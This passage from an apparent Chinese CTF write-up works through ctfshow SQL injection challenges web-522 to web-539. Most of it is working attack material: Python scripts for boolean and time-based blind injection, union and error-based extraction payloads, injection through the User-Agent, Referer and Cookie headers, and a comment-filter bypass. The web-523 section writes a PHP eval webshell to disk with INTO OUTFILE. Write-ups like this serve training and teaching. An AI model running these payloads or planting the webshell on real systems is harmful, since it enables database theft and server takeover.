class="hljs-keyword">if</span>(<span class="hljs-built_in">ascii</span>(substr((select group_concat(column_name) from information_schema.<span class="hljs-built_in">columns</span> where table_name=<span class="hljs-string">&quot;flagpuck&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+&#x27;<br>            payload = f&#x27;<span class="hljs-number">1</span>\&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ascii</span>(substr((select group_concat(flag33) from ctfshow.flagpuck),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+&#x27;<br><br>            r = requests.<span class="hljs-built_in">get</span>(url=url + payload)<br>            <span class="hljs-keyword">if</span> &#x27;You are <span class="hljs-keyword">in</span>&#x27; <span class="hljs-keyword">in</span> r.text:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += chr(low)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">break</span><br>        <span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-522-布尔盲注id-1”"><a href="#web-522-布尔盲注id-1”" class="headerlink" title="web-522 布尔盲注id&#x3D;1”"></a>web-522 布尔盲注id&#x3D;1”</h2><p>双引号闭合”，其他和上题一样，使用布尔盲注即可</p>
+<hr>
+<h2 id="web-523-利用SQL中的into-outfile-函数-id-1’"><a href="#web-523-利用SQL中的into-outfile-函数-id-1’" class="headerlink" title="web-523 利用SQL中的into outfile 函数 id&#x3D;1’))"></a>web-523 利用SQL中的into outfile 函数 id&#x3D;1’))</h2><p>首先测试闭合，测试出来是<code>&#39;))</code>闭合，所以这里用布尔盲注也可以，但是这里提示我们使用写入文件的方式拿到flag。</p>
+<p>payload：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//将表名写入到1.txt文件中，访问文件得到表名flagdk</span><br>?id=<span class="hljs-number">1&#x27;</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctfshow&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/var/www/html/1.txt&quot;</span>--+<br><br><span class="hljs-comment">//将列名写入到2.txt下，访问文件得到列名</span><br>?id=<span class="hljs-number">1&#x27;</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flagdk&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/var/www/html/2.txt&quot;</span>--+<br><br><span class="hljs-comment">//将flag写入到3.txt，访问文件得到flag</span><br>?id=<span class="hljs-number">1&#x27;</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag43) <span class="hljs-keyword">from</span> ctfshow.flagdk <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/var/www/html/3.txt&quot;</span>--+<br><br>这题也可以在写入的文件里插入一句话木马，然后蚁剑连接得到flag<br>?id=<span class="hljs-number">1&#x27;</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;D:\\SoftWare\\PHPstudy\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\a.php&#x27;</span> --+<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-524-布尔盲注"><a href="#web-524-布尔盲注" class="headerlink" title="web-524 布尔盲注"></a>web-524 布尔盲注</h2><p>同上布尔盲注</p>
+<hr>
+<h2 id="web-525-时间盲注id-1’"><a href="#web-525-时间盲注id-1’" class="headerlink" title="web-525 时间盲注id&#x3D;1’"></a>web-525 时间盲注id&#x3D;1’</h2><p>首先测试闭合类型，用了很多种测试发现回显都不变化，尝试一下时间盲注测试</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and sleep(<span class="hljs-number">3</span>)--+<br></code></pre></td></tr></table></figure>
+
+<p>发现页面3秒后才响应，所以这题是单引号注入，且能够时间盲注，使用时间盲注脚本</p>
+<p>python脚本</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import requests<br>import <span class="hljs-built_in">time</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    url = <span class="hljs-string">&#x27;http://e8c67313-e60b-4134-a12c-c84afb13e1b3.challenge.ctf.show/?id=&#x27;</span><br>    <span class="hljs-built_in">result</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> True:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2</span><br>            payload = f<span class="hljs-string">&#x27;1\&#x27; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagugs&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            stime=<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<br>            r = requests.<span class="hljs-built_in">get</span>(url=url + payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()-stime&lt;<span class="hljs-number">1</span>:<br>                low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = <span class="hljs-keyword">mid</span><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            <span class="hljs-built_in">result</span> += chr(low)<br>        <span class="hljs-keyword">else</span>:<br>            break<br>        print(<span class="hljs-built_in">result</span>)<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-526-时间盲注id-1”"><a href="#web-526-时间盲注id-1”" class="headerlink" title="web-526 时间盲注id&#x3D;1”"></a>web-526 时间盲注id&#x3D;1”</h2><p>同样是时间盲注，就是换成了双引号闭合</p>
+<hr>
+<h2 id="web-527-POST字符型注入username-1’"><a href="#web-527-POST字符型注入username-1’" class="headerlink" title="web-527 POST字符型注入username&#x3D;1’"></a>web-527 POST字符型注入username&#x3D;1’</h2><p>这里就到了POST注入了。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs csharp">在username输入框中注入，也可以抓包在请求头中注入<br><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(schema_name)<span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-meta">#</span><br><br><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name)<span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctfshow&#x27;</span><span class="hljs-meta">#</span><br><br><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name)<span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flagugsd&#x27;</span><span class="hljs-meta">#</span><br><br><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(flag43s) <span class="hljs-keyword">from</span> ctfshow.flagugsd<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-528-POST字符型注入username-1”"><a href="#web-528-POST字符型注入username-1”" class="headerlink" title="web-528 POST字符型注入username&#x3D;1”)"></a>web-528 POST字符型注入username&#x3D;1”)</h2><p>前面的步骤都一样，只是换成了”)注入</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span>&quot;) union <span class="hljs-selector-tag">select</span> <span class="hljs-number">1</span>,group_concat(flag43as) <span class="hljs-selector-tag">from</span> ctfshow<span class="hljs-selector-class">.flagugsds</span>#<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-529-报错注入username-1’"><a href="#web-529-报错注入username-1’" class="headerlink" title="web-529 报错注入username&#x3D;1’)"></a>web-529 报错注入username&#x3D;1’)</h2><p>闭合错误时有语句错误回显，所以可以使用报错注入。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))#</span><br><span class="hljs-string"></span><br><span class="hljs-string">admin&#x27;</span>) <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(flag4) <span class="hljs-keyword">from</span> ctfshow.flag),<span class="hljs-number">0x7e</span>))#<br><br><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;) and extractvalue(1,concat(0x7e,(select right(group_concat(flag4),20) from ctfshow.flag),0x7e))#</span><br><span class="hljs-string"></span><br><span class="hljs-string">报错注入用or也可以，而且可以用()来绕过空格过滤</span><br><span class="hljs-string">例如：</span><br><span class="hljs-string">admin&#x27;</span>)<span class="hljs-keyword">or</span>(extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">0x7e</span>)))#<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-530-报错注入usrename-1”、布尔盲注"><a href="#web-530-报错注入usrename-1”、布尔盲注" class="headerlink" title="web-530 报错注入usrename&#x3D;1”、布尔盲注"></a>web-530 报错注入usrename&#x3D;1”、布尔盲注</h2><p>同样是报错注入，只是换成了”闭合，这题和上题都可以使用POST布尔盲注</p>
+<p>POST布尔盲注脚本</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">time</span><br>url=<span class="hljs-string">&quot;https://5bb66a59-8c81-497d-99f9-339726c2ffa1.challenge.ctf.show/&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    low=<span class="hljs-number">32</span><br>    high=<span class="hljs-number">127</span><br>    i=i+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> low&lt;high:<br>        <span class="hljs-built_in">mid</span>=(low+high) <span class="hljs-comment">// 2</span><br>        data=&#123;<br>            <span class="hljs-string">&#x27;uname&#x27;</span>:f<span class="hljs-string">&#x27;admin&quot; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&#x27;</span>,<br>            <span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span><br>        &#125;<br>        response=requests.post(url=url,data=data)<br>        <span class="hljs-keyword">if</span> response.<span class="hljs-built_in">text</span>.<span class="hljs-built_in">find</span>(<span class="hljs-string">&quot;flag.jpg&quot;</span>)&gt;<span class="hljs-number">0</span>:<br>            low=<span class="hljs-built_in">mid</span>+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high=<span class="hljs-built_in">mid</span><br>    <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>        flag+=chr(low)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    print(flag)<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-531-报错注入username-admin’"><a href="#web-531-报错注入username-admin’" class="headerlink" title="web-531 报错注入username&#x3D;admin’"></a>web-531 报错注入username&#x3D;admin’</h2><p>‘闭合，其他如上</p>
+<hr>
+<h2 id="web-532-报错注入username-admin”"><a href="#web-532-报错注入username-admin”" class="headerlink" title="web-532 报错注入username&#x3D;admin”)"></a>web-532 报错注入username&#x3D;admin”)</h2><p>“)闭合，其他如上</p>
+<hr>
+<h2 id="web-533-报错注入password-1’"><a href="#web-533-报错注入password-1’" class="headerlink" title="web-533 报错注入password&#x3D;1’"></a>web-533 报错注入password&#x3D;1’</h2><p>在密码行进行报错注入</p>
+<p>判断闭合:</p>
+<p>无论密码如何设置都会显示成功所以只有当你成功闭合后面写上错误语句时才会报错否则不会报错</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select (table_name) from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br><br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select (column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br><br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select (flag4) from ctfshow.flag),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select right(flag4,<span class="hljs-number">20</span>) from ctfshow.flag),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure>
+
+<h2 id="web-534-ua头注入"><a href="#web-534-ua头注入" class="headerlink" title="web-534 ua头注入"></a>web-534 ua头注入</h2><p>首先需要登录成功。</p>
+<p>name：admin</p>
+<p>password：admin</p>
+<p>发现登录成功后会回显ua头</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nsis">所以ua头注入<br><br>用hackbar<br><br>添加ua头先法送一次再用<span class="hljs-literal">admin</span> <span class="hljs-literal">admin</span> 登录你的ua头才是你自己定义的<br><br>或者是直接在bp上搞<br><br><span class="hljs-literal">User</span>-Agent: <span class="hljs-string">&#x27;or updatexml(1,concat(0x7e,(select group_concat(flag4)from ctfshow.flag),0x7e),1)or&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; =&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>也可以使用python脚本</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>payload = <span class="hljs-string">&#x27;group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;&#x27;</span>;<br><span class="hljs-comment"># payload = &#x27;group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;&#x27;;</span><br><span class="hljs-comment"># payload = &#x27;group_concat(flag4) from ctfshow.flag&#x27;;</span><br><span class="hljs-comment">#payload = &#x27;right(flag4,20) from ctfshow.flag&#x27;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>:f<span class="hljs-string">&quot;&#x27;and extractvalue(1,concat(0x7e,(select &#123;payload&#125;),0x7e)) and &#x27;1&#x27;=&#x27;1&quot;</span>,<br>&#125;<br>data = &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>,<br>    <span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span><br>&#125;<br>url = <span class="hljs-string">&#x27;http://00b0f88f-cc13-4a9b-bdfe-03e9f25c7bcc.challenge.ctf.show/&#x27;</span><br>r = requests.post(url, <span class="hljs-attribute">headers</span>=headers, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(r.text)<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-535-referer注入"><a href="#web-535-referer注入" class="headerlink" title="web-535 referer注入"></a>web-535 referer注入</h2><p>首先需要登录成功。</p>
+<p>name：admin</p>
+<p>password：admin</p>
+<p>然后发现登录成功的界面会回显referer头信息</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso">所以这里可以使用<span class="hljs-keyword">referer</span>注入<br><br>在hackbar或者bp抓包中测试闭合<br><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>假如说闭合错误的话会有报错<br><br><span class="hljs-string">&#x27;or updatexml(1,concat(0x7e,(select group_concat(flag4)from ctfshow.flag),0x7e),1)or&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; =&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>同样可以使用python脚本</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>payload = <span class="hljs-string">&#x27;group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;&#x27;</span>;<br><span class="hljs-comment"># payload = &#x27;group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;&#x27;;</span><br><span class="hljs-comment"># payload = &#x27;group_concat(flag4) from ctfshow.flag&#x27;;</span><br><span class="hljs-comment">#payload = &#x27;right(flag4,20) from ctfshow.flag&#x27;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Referer&quot;</span>:f<span class="hljs-string">&quot;&#x27;and extractvalue(1,concat(0x7e,(select &#123;payload&#125;),0x7e)) and &#x27;1&#x27;=&#x27;1&quot;</span>,<br>&#125;<br>data = &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>,<br>    <span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span><br>&#125;<br>url = <span class="hljs-string">&#x27;http://00b0f88f-cc13-4a9b-bdfe-03e9f25c7bcc.challenge.ctf.show/&#x27;</span><br>r = requests.post(url, <span class="hljs-attribute">headers</span>=headers, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-536-cookie注入、uname-admin’"><a href="#web-536-cookie注入、uname-admin’" class="headerlink" title="web-536 cookie注入、uname&#x3D;admin’"></a>web-536 cookie注入、uname&#x3D;admin’</h2><p>首先需要登录成功。</p>
+<p>name：admin</p>
+<p>password：admin</p>
+<p>然后登录成功后发现会回显cookie信息</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">先登录然后抓包，或者hackbar修改cookie<br>在<span class="hljs-attribute">uname</span>=admin后添加payload<br><br>Cookie：<span class="hljs-attribute">uname</span>=admin&#x27;or updatexml(1,concat(0x7e,(select group_concat(flag4)<span class="hljs-keyword">from</span> ctfshow.flag),0x7e),32)<span class="hljs-keyword">or</span><span class="hljs-string">&#x27;1&#x27;</span> =<span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure>
+
+<p>python脚本也行。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>payload = <span class="hljs-string">&#x27;group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;&#x27;</span>;<br><span class="hljs-comment"># payload = &#x27;group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;&#x27;;</span><br><span class="hljs-comment"># payload = &#x27;group_concat(flag4) from ctfshow.flag&#x27;;</span><br><span class="hljs-comment">#payload = &#x27;right(flag4,20) from ctfshow.flag&#x27;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Cookie&quot;</span>:f<span class="hljs-string">&quot;uname=admin&#x27;or extractvalue(1,concat(0x7e,(select &#123;payload&#125;),0x7e)) and &#x27;1&#x27;=&#x27;1&quot;</span>,<br>&#125;<br>data = &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>,<br>    <span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span><br>&#125;<br>url = <span class="hljs-string">&#x27;http://00b0f88f-cc13-4a9b-bdfe-03e9f25c7bcc.challenge.ctf.show/&#x27;</span><br>r = requests.post(url, <span class="hljs-attribute">headers</span>=headers, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-537-Cookie注入、base64加密、uname-’"><a href="#web-537-Cookie注入、base64加密、uname-’" class="headerlink" title="web-537 Cookie注入、base64加密、uname&#x3D;’)"></a>web-537 Cookie注入、base64加密、uname&#x3D;’)</h2><p>用简单命令先测试闭合方式</p>
+<figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">多了个base64<br><br>加密<br><br>进行加密即可<br>&#x27;) <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(flag4),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> ctfshow.flag <span class="hljs-comment">#</span><br><br>base64编码:<br>JykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KGZsYWc0KSwzIGZyb20gY3Rmc2hvdy5mbGFnICM=<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-538-uname-”"><a href="#web-538-uname-”" class="headerlink" title="web-538 uname&#x3D;”"></a>web-538 uname&#x3D;”</h2><p>其他和上一题一样，双引号”闭合</p>
+<hr>
+<h2 id="web-539-00注释符过滤绕过"><a href="#web-539-00注释符过滤绕过" class="headerlink" title="web-539 ;%00注释符过滤绕过"></a>web-539 ;%00注释符过滤绕过</h2><p>一:</p>
+<p>可以看到后端对–+和#都进行了过滤，所以我们用url结束符： <strong>;%00</strong></p>
+<p>二:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs routeros">我们可以<br><br>•1. ?<span class="hljs-attribute">id</span>=1 返回正常<br><br>•2. ?<span class="hljs-attribute">id</span>=1&#x27; 返回异常，说明可能存在漏洞<br><br>•3. ?<span class="hljs-attribute">id</span>=1&#x27; --+ 或者?<span class="hljs-attribute">id</span>=1&#x27; # 均返回错误，通过源代码分析，我们得知--+ # 都被替换为了空格，这里使用 ;%00充当注释符<br><br>•4.?<span class="hljs-attribute">id</span>=1&#x27; order by 3 ;%00 查多少列<br><br>•5. ?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,3 ;%00 查找回显位置<br><br>•6. ?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2, group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata ;%00 查库名<br><br>•7. ?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2, group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema = 0x7365637572697479 ;%00 查表名<br><br>•8. ?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2, group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name = 0x7573657273 ;%00 查字段名<br><br>•9. ?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2, group_concat(concat_ws(0x7e,username,password)) <span class="hljs-keyword">from</span> security.users ;%00 查出字段中所有的值<br><br>也可以不用报错注入<br><br>但是前面的id应等与一个不纯在的数<br><br>也可以报错注入<br><br>?<span 